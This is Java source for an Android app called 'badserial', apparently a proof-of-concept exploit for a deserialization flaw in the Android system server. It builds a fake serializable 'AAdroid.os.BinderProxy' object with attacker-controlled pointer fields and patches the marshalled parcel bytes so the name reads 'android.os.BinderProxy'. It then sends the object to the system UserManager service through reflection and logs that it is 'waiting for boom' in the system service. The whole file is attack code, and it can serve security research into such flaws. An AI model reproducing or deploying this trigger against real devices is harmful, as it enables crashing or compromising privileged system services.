===============================================================================
package net.thejh.badserial;

import java.io.Serializable;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.UserHandle;
import android.os.UserManager;
import android.util.Log;

public class MainActivity extends Activity {
        private static final java.lang.String DESCRIPTOR = "android.os.IUserManager";
        private Class clStub;
        private Class clProxy;
        private int TRANSACTION_setApplicationRestrictions;
        private IBinder mRemote;
        
        public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int 
userHandle) throws android.os.RemoteException
        {
                android.os.Parcel _data = android.os.Parcel.obtain();
                android.os.Parcel _reply = android.os.Parcel.obtain();
                try {
                        _data.writeInterfaceToken(DESCRIPTOR);
                        _data.writeString(packageName);
                        _data.writeInt(1);
                        restrictions.writeToParcel(_data, 0);
                        _data.writeInt(userHandle);
                        
                byte[] data = _data.marshall();
                for (int i=0; true; i++) {
                        if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
                                data[i] = 'a';
                                data[i+1] = 'n';
                                break;
                        }
                }
                _data.recycle();
                _data = Parcel.obtain();
                _data.unmarshall(data, 0, data.length);
                        
                        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
                        _reply.readException();
                }
                finally {
                        _reply.recycle();
                        _data.recycle();
                }
        }

        @Override
        public void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_main);

                Log.i("badserial", "starting... (v3)");

                Context ctx = getBaseContext();
                try {
                        Bundle b = new Bundle();
                        AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
                        b.putSerializable("eatthis", evilProxy);
                        
                        Class clIUserManager = Class.forName("android.os.IUserManager");
                        Class[] umSubclasses = clIUserManager.getDeclaredClasses();
                        System.out.println(umSubclasses.length+" inner classes found");
                        Class clStub = null;
                        for (Class c: umSubclasses) {
                                System.out.println("inner class: "+c.getCanonicalName());
                                if (c.getCanonicalName().equals("android.os.IUserManager.Stub")) {
                                        clStub = c;
                                }
                        }
                        
                        Field fTRANSACTION_setApplicationRestrictions =
                                        clStub.getDeclaredField("TRANSACTION_setApplicationRestrictions");
                        fTRANSACTION_setApplicationRestrictions.setAccessible(true);
                        TRANSACTION_setApplicationRestrictions =
                                        fTRANSACTION_setApplicationRestrictions.getInt(null);
                        
                        UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
                        Field fService = UserManager.class.getDeclaredField("mService");
                        fService.setAccessible(true);
                        Object proxy = fService.get(um);
                        
                        Class[] stSubclasses = clStub.getDeclaredClasses();
                        System.out.println(stSubclasses.length+" inner classes found");
                        clProxy = null;
                        for (Class c: stSubclasses) {
                                System.out.println("inner class: "+c.getCanonicalName());
                                if (c.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
                                        clProxy = c;
                                }
                        }
                        
                        Field fRemote = clProxy.getDeclaredField("mRemote");
                        fRemote.setAccessible(true);
                        mRemote = (IBinder) fRemote.get(proxy);

                        UserHandle me = android.os.Process.myUserHandle();
                        setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
                        
                        Log.i("badserial", "waiting for boom here and over in the system service...");
                } catch (Exception e) {
                        throw new RuntimeException(e);
                }
        }
}
===============================================================================
package AAdroid.os;

import java.io.Serializable;

public class BinderProxy implements Serializable {
        private static final long serialVersionUID = 0;
        public long mObject = 0x1337beef;
        public long mOrgue = 0x1337beef;
}
===============================================================================
